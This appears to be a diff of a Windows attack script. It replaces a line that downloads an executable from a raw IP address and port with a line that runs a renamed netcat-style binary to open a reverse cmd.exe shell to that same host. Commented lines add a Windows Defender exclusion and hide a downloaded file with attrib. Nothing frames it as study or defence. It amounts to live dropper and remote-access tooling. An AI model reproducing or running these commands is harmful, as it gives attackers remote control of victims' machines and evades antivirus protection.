@@ -3,7 +3,7 @@
 #Add-MpPreference -ExclusionPath $exclusionPath
 
 
-Invoke-WebRequest -Uri http://193.161.193.99:40877/ana123.exe -OutFile C:\Users\ana\Downloads\ana123.exe
+C:\Users\Public\RNM.exe -nv 193.161.193.99 40877 -e cmd.exe
 
 #C:\Users\ana\Downloads\ana123.exe
 #attrib +h C:\Users\seba\downloads\shaxh21.exe
